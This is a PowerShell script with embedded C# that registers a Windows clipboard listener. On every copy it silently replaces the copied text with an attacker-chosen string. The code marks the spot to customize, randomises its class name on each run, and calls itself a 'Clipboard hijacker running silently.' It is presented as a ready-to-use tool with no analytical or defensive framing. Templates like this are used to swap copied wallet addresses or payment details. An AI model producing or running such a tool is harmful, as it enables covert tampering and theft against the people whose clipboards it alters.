# Generate a unique class name each run to avoid "already exists" errors
$className = "ClipboardWatcher_" + (Get-Random)

Add-Type -ReferencedAssemblies 'System.Windows.Forms','System.Drawing' -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class $className : NativeWindow {
    private const int WM_CLIPBOARDUPDATE = 0x031D;

    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool AddClipboardFormatListener(IntPtr hwnd);

    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool RemoveClipboardFormatListener(IntPtr hwnd);

    [DllImport("user32.dll")] 
    public static extern bool OpenClipboard(IntPtr hWndNewOwner);

    [DllImport("user32.dll")] 
    public static extern bool CloseClipboard();

    [DllImport("user32.dll")] 
    public static extern IntPtr GetClipboardData(uint uFormat);

    [DllImport("user32.dll")] 
    public static extern bool IsClipboardFormatAvailable(uint format);

    [DllImport("kernel32.dll")] 
    public static extern IntPtr GlobalLock(IntPtr hMem);

    [DllImport("kernel32.dll")] 
    public static extern bool GlobalUnlock(IntPtr hMem);

    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool EmptyClipboard();

    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GlobalFree(IntPtr hMem);

    public const uint CF_UNICODETEXT = 13;
    public const uint GMEM_MOVEABLE = 0x0002;

    public $className() {
        CreateHandle(new CreateParams());
        AddClipboardFormatListener(this.Handle);
    }

    protected override void WndProc(ref Message m) {
        if (m.Msg == WM_CLIPBOARDUPDATE) {
            if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
                if (OpenClipboard(IntPtr.Zero)) {
                    IntPtr hClip = GetClipboardData(CF_UNICODETEXT);
                    if (hClip != IntPtr.Zero) {
                        IntPtr pText = GlobalLock(hClip);
                        if (pText != IntPtr.Zero) {
                            string originalText = Marshal.PtrToStringUni(pText);
                            if (!string.IsNullOrEmpty(originalText)) {
                                // *** CHANGE CLIPBOARD CONTENT HERE ***
                                string newText = "[REPLACED TEXT]"; // customize here
                                
                                // Replace clipboard with new text
                                EmptyClipboard();
                                IntPtr hNewMem = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)((newText.Length + 1) * 2));
                                IntPtr pNewMem = GlobalLock(hNewMem);
                                Marshal.Copy(newText.ToCharArray(), 0, pNewMem, newText.Length);
                                Marshal.WriteInt16(pNewMem, newText.Length * 2, 0); // null terminator
                                GlobalUnlock(hNewMem);
                                SetClipboardData(CF_UNICODETEXT, hNewMem);
                            }
                            GlobalUnlock(hClip);
                        }
                    }
                    CloseClipboard();
                }
            }
        }
        base.WndProc(ref m);
    }
}
"@

# Create the watcher dynamically using the random class name
$watcher = New-Object $className

Write-Host "[*] Clipboard hijacker running silently."
Write-Host "    - Any copied text will be replaced with '[REPLACED TEXT]'"
Write-Host "Press Ctrl+C to exit."

# Message loop (keeps it alive)
while ($true) {
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 200
}
